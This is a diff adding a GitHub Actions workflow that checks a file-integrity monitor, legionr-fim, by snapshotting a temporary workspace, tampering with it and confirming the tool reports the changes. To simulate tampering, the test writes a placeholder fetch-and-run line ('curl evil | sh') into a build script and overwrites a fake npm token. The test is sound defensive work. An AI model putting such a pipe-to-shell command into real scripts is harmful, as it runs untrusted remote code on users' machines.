@@ -1,0 +1,57 @@
+name: FIM self-test
+
+# Deterministic proof that file-integrity detection works end-to-end through the
+# actual legionr-fim binary (the unit tests cover the engine; this exercises the
+# built CLI + JSON surface the action depends on). Builds in-PR code (cargo from
+# the checkout), so any dependency or toolchain bump that breaks FIM fails here
+# — this is the compatibility gate for Dependabot PRs.
+
+on:
+  workflow_dispatch:
+  push:
+    branches: ['**']
+    paths:
+      - 'crates/legionr-core/src/fim.rs'
+      - 'crates/legionr-fim/**'
+      - 'crates/legionr-core/Cargo.toml'
+      - 'Cargo.toml'
+      - 'Cargo.lock'
+      - 'action/fim.js'
+      - '.github/workflows/fim-selftest.yml'
+
+jobs:
+  fim:
+    name: Snapshot → tamper → detect
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: dtolnay/rust-toolchain@stable
+
+      - name: Build legionr-fim
+        run: cargo build --release -p legionr-fim
+
+      - name: Detect source + sensitive tampering
+        run: |
+          set -euo pipefail
+          BIN="target/release/legionr-fim"
+          WS="$(mktemp -d)"; mkdir -p "$WS/src"
+          HOME_DIR="$(mktemp -d)"
+          SECRET="$WS/project.npmrc"
+          printf '#!/bin/sh\necho ok\n' > "$WS/src/build.sh"
+          printf 'token=keep\n'        > "$SECRET"
+
+          HOME="$HOME_DIR" "$BIN" snapshot /tmp/snap.json --workspace "$WS" --extra "$SECRET"
+
+          clean="$("$BIN" diff /tmp/snap.json)"
+          echo "clean diff: $clean"
+          [ "$clean" = "[]" ] || { echo "FAIL — expected no changes before tampering"; exit 1; }
+
+          # Tamper both scopes: overwrite a checked-out source file and a secret.
+          printf '#!/bin/sh\ncurl evil | sh\n' > "$WS/src/build.sh"
+          printf 'token=STOLEN\n'              > "$SECRET"
+
+          dirty="$("$BIN" diff /tmp/snap.json)"
+          echo "tampered diff: $dirty"
+          echo "$dirty" | grep -q 'build.sh'      || { echo "FAIL — source tamper not detected"; exit 1; }
+          echo "$dirty" | grep -q 'project.npmrc' || { echo "FAIL — sensitive tamper not detected"; exit 1; }
+          echo "PASS — legionr-fim detected source + sensitive tampering."
